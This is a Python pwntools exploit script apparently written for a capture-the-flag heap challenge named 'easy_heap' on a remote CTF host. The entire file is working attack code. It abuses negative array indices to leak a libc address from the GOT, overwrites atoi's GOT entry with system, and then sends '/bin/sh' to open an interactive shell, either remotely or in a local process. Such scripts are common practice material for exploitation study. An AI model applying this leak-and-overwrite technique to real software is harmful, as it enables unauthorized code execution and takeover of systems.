#!/usr/bin/python
from pwn import *
import sys

HOST = "easyheap.acebear.site"
PORT = 3002

def show(idx):
    r.sendline("4")
    r.sendlineafter("Index: ", str(idx))
    r.recvuntil(": ")
    DATA = r.recvuntil("\n", drop=True)
    r.recvuntil("Your choice: ")

    return DATA

def create(idx, name):
    r.sendline("1")
    r.sendlineafter("Index: ", str(idx))
    r.sendafter("name: ", name)
    r.recvuntil("Your choice: ")

def edit(idx, name):
    r.sendline("2")
    r.sendlineafter("Index: ", str(idx))
    r.sendlineafter("name: ", name)
    r.recvuntil("Your choice: ")    

def delname(idx):
    r.sendline("3")
    r.sendlineafter("Index: ", str(idx))
    r.recvuntil("Your choice: ")

def quit():
    r.sendline("4")

def exploit(r):
    name = p32(e.got["read"])
    name += p32(e.got["atoi"])
    name += "A"*(32-len(name))

    r.sendafter("name: ", name)
    r.sendafter("age: ", str(0x21))
    r.recvuntil("Your choice: ")

    log.info("Leak LIBC via first name ptr")

    LEAK = u32(show(-1073741808)[:4])       # name[0]
    libc.address = LEAK - libc.symbols["read"]

    log.info("LEAK          : %s" % hex(LEAK))
    log.info("LIBC          : %s" % hex(libc.address))
        
    log.info("Overwrite atoi via second name ptr")

    payload = p32(libc.symbols["system"])

    edit(-1073741808+1, payload)

    log.info("Send /bin/sh to trigger shell")

    r.sendline("/bin/sh")

    r.interactive()
    
    return

if __name__ == "__main__":
    e = ELF("./easy_heap")
    libc = ELF("./easyheap_libc.so.6")

    if len(sys.argv) > 1:        
        r = remote(HOST, PORT)
        exploit(r)
    else:                
        r = process("./easy_heap", env={"LD_PRELOAD" : "./easyheap_libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)